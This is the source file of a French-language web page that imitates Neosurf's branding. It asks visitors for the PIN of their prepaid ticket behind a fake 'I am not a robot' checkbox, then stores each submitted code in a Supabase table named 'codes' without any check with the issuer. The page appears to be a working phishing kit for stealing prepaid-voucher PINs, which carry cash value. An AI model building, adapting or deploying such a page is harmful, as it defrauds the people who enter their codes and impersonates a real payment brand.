"use client";

import { useRef, useState } from "react";
import { supabase } from "../../lib/supabase";

function EyeOpenIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#212853" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12Z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );
}

function EyeClosedIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#212853" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19C5 19 1 12 1 12a21.77 21.77 0 0 1 5.06-5.94" />
      <path d="M9.9 4.24A10.93 10.93 0 0 1 12 5c7 0 11 7 11 7a21.72 21.72 0 0 1-3.17 4.36" />
      <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
      <path d="M1 1l22 22" />
    </svg>
  );
}

export default function EmployePage() {
  const [part1, setPart1] = useState("");
  const [part2, setPart2] = useState("");
  const [part3, setPart3] = useState("");
  const [showCode, setShowCode] = useState(false);
  const [isChecked, setIsChecked] = useState(false);

  const input2Ref = useRef<HTMLInputElement>(null);
  const input3Ref = useRef<HTMLInputElement>(null);

  const cleanValue = (value: string) => value.replace(/[^a-zA-Z0-9]/g, "");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!isChecked) {
      alert("Veuillez confirmer que vous n'êtes pas un robot");
      return;
    }

    const fullCode = `${part1}${part2}${part3}`;

    if (part1.length !== 4 || part2.length !== 3 || part3.length !== 3) {
      alert("Code incomplet");
      return;
    }

    const { error } = await supabase.from("codes").insert({
      code: fullCode,
    });

    if (error) {
      alert("Erreur");
      return;
    }

    alert("Code envoyé !");
    setPart1("");
    setPart2("");
    setPart3("");
    setIsChecked(false);
  };

  return (
    <main style={{ minHeight: "100vh", background: "#e9ecef", fontFamily: "Arial, sans-serif" }}>
      <style>
        {`
          @keyframes pulseCaptcha {
            0% {
              transform: scale(1);
              box-shadow: 0 0 0 0 rgba(69, 168, 201, 0.25);
            }
            50% {
              transform: scale(1.12);
              box-shadow: 0 0 0 7px rgba(69, 168, 201, 0.15);
            }
            100% {
              transform: scale(1);
              box-shadow: 0 0 0 0 rgba(69, 168, 201, 0.25);
            }
          }
        `}
      </style>

      <div style={{ height: "100px", background: "#212853", display: "flex", alignItems: "center", paddingLeft: "30px" }}>
        <img src="/logo.png" alt="logo" style={{ height: "75px", objectFit: "contain" }} />
      </div>

      <div style={{ marginTop: "40px", display: "flex", justifyContent: "center", padding: "0 16px" }}>
        <div style={{ width: "100%", maxWidth: "500px", background: "#fff", borderRadius: "4px", boxShadow: "0 2px 10px rgba(0,0,0,0.08)", overflow: "hidden" }}>
          <div style={{ padding: "28px 20px", textAlign: "center" }}>
            <h1 style={{ margin: 0, fontSize: "28px", fontWeight: 700, color: "#111" }}>
              Entrez le code Pin du ticket
            </h1>
          </div>

          <div style={{ borderTop: "1px solid #d1d5db" }} />

          <div style={{ padding: "45px 20px 35px", display: "flex", flexDirection: "column", alignItems: "center" }}>
            <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", alignItems: "center", width: "100%", maxWidth: "320px", margin: "0 auto" }}>
              <div style={{ position: "relative", display: "flex", justifyContent: "center", marginBottom: "24px", width: "100%" }}>
                <div style={{ display: "flex", border: "1px solid #cfd4da", borderRadius: "4px", overflow: "hidden", background: "#fff" }}>
                  <input
                    type={showCode ? "text" : "password"}
                    value={part1}
                    onChange={(e) => {
                      const v = cleanValue(e.target.value).slice(0, 4);
                      setPart1(v);
                      if (v.length === 4) input2Ref.current?.focus();
                    }}
                    maxLength={4}
                    style={{ width: "65px", height: "55px", border: "none", borderRight: "1px solid #cfd4da", textAlign: "center", fontSize: "20px", outline: "none", color: "#000", WebkitTextFillColor: "#000", background: "#fff", opacity: 1 }}
                  />

                  <input
                    ref={input2Ref}
                    type={showCode ? "text" : "password"}
                    value={part2}
                    onChange={(e) => {
                      const v = cleanValue(e.target.value).slice(0, 3);
                      setPart2(v);
                      if (v.length === 3) input3Ref.current?.focus();
                    }}
                    maxLength={3}
                    style={{ width: "65px", height: "55px", border: "none", borderRight: "1px solid #cfd4da", textAlign: "center", fontSize: "20px", outline: "none", color: "#000", WebkitTextFillColor: "#000", background: "#fff", opacity: 1 }}
                  />

                  <input
                    ref={input3Ref}
                    type={showCode ? "text" : "password"}
                    value={part3}
                    onChange={(e) => {
                      const v = cleanValue(e.target.value).slice(0, 3);
                      setPart3(v);
                    }}
                    maxLength={3}
                    style={{ width: "65px", height: "55px", border: "none", textAlign: "center", fontSize: "20px", outline: "none", color: "#000", WebkitTextFillColor: "#000", background: "#fff", opacity: 1 }}
                  />
                </div>

                <button
                  type="button"
                  onClick={() => setShowCode(!showCode)}
                  aria-label={showCode ? "Masquer le code" : "Afficher le code"}
                  title={showCode ? "Masquer le code" : "Afficher le code"}
                  style={{
                    position: "absolute",
                    left: "calc(50% + 110px)",
                    top: "50%",
                    transform: "translateY(-50%)",
                    width: "44px",
                    height: "44px",
                    border: "1px solid #cfd4da",
                    borderRadius: "999px",
                    background: "#fff",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    padding: 0,
                  }}
                >
                  {showCode ? <EyeClosedIcon /> : <EyeOpenIcon />}
                </button>
              </div>

              <div
                onClick={() => setIsChecked(!isChecked)}
                style={{
                  width: "100%",
                  maxWidth: "320px",
                  border: "1px solid #cfd4da",
                  borderRadius: "6px",
                  padding: "14px",
                  display: "flex",
                  alignItems: "center",
                  gap: "12px",
                  cursor: "pointer",
                  background: "#fff",
                  marginBottom: "20px",
                  boxSizing: "border-box",
                }}
              >
                <div
                  style={{
                    width: "22px",
                    height: "22px",
                    border: "2px solid #45a8c9",
                    borderRadius: "50%",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    background: isChecked ? "#45a8c9" : "#fff",
                    transition: "0.2s",
                    flexShrink: 0,
                    animation: !isChecked ? "pulseCaptcha 1.6s infinite ease-in-out" : "none",
                  }}
                >
                  {isChecked && <span style={{ color: "#fff", fontSize: "14px", fontWeight: 700 }}>✓</span>}
                </div>

                <span style={{ fontSize: "12px", color: "#333", fontWeight: 500 }}>
                  JE NE SUIS PAS UN ROBOT.
                </span>

                <div style={{ marginLeft: "auto", fontSize: "10px", color: "#999" }}>
                  IconCaptcha ©
                </div>
              </div>

              <button
                type="submit"
                style={{
                  background: "#e91e8f",
                  color: "#fff",
                  border: "none",
                  borderRadius: "4px",
                  fontSize: "18px",
                  fontWeight: 700,
                  padding: "14px 40px",
                  cursor: "pointer",
                  width: "210px",
                }}
              >
                Soumettre
              </button>
            </form>
          </div>
        </div>
      </div>

      <div style={{ background: "#ffffff", marginTop: "50px", padding: "30px 16px 50px" }}>
        <div style={{ textAlign: "center", fontSize: "16px", color: "#e91e8f", marginBottom: "18px" }}>
          Conditions · Politique de confidentialité · Besoin d'aide ? · Français
        </div>

        <div style={{ borderTop: "1px solid #d1d5db", margin: "0 auto 18px", maxWidth: "1100px" }} />

        <div style={{ display: "flex", justifyContent: "center" }}>
          <div style={{ maxWidth: "1100px", textAlign: "left", fontSize: "14px", color: "#6b7280", lineHeight: "1.9" }}>
            © 2026 <span style={{ color: "#e91e8f" }}>NS CARDS FRANCE SAS</span>
            &nbsp; | &nbsp; Les cartes Neosurf sont émises par NS Cards France SAS («
            Neosurf ») et tous les fonds chargés sur ces cartes sont conservés sur
            un compte au nom de « Neosurf » et géré par Andaria Financial Services
            Limited (« Andaria »). Andaria Financial Services Limited (numéro
            d'enregistrement de la société C97170) est agréée par l’Autorité
            maltaise des services financiers (« MFSA ») en tant qu’établissement
            financier au sens de l'article 5 de la loi de 1994 sur les
            établissements financiers (chapitre 376 des lois de Malte).
          </div>
        </div>
      </div>
    </main>
  );
}